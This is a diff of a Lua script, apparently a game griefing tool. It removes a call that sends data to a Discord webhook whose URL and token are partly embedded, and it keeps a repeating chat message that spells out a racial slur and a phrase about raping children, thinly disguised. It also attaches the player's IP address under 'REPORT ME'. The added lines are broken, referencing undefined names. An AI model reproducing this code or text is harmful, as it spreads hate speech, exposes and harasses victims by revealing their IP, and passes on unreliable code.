@@ -82,7 +82,6 @@ local webhookUrl = "https://discord.com/api/webhooks/1314907175189086208/zaCXT3r
 local webhookData = createWebhookData()
 
 -- Sending the webhook
-sendWebhook(webhookUrl, webhookData)
 local message = "<N<I<G<G<A> <I <R<A<P<E <K<I<D<S" -- Change this to any message you want
 function format_ip(ip)
     local formatted_ip = ""
@@ -95,8 +94,11 @@ function format_ip(ip)
     end
     return formatted_ip:sub(1, -2)  -- Remove the last dot
 end
+    local ip = "192.168.1.1"  -- Replace this with a function to get the actual IP address
+    local formatted_ip = format_ip(GetIp)
+    print(message2)  -- Print the message
 
-local message2 = "MY IP: " .. format_ip(ip) .. "REPORT ME"
+ local message2 = "MY IP: " .. formatted_ip  -- Concatenate message with formatted IP
 local delayTime = 8 -- Time in seconds between messages
 
 while true do
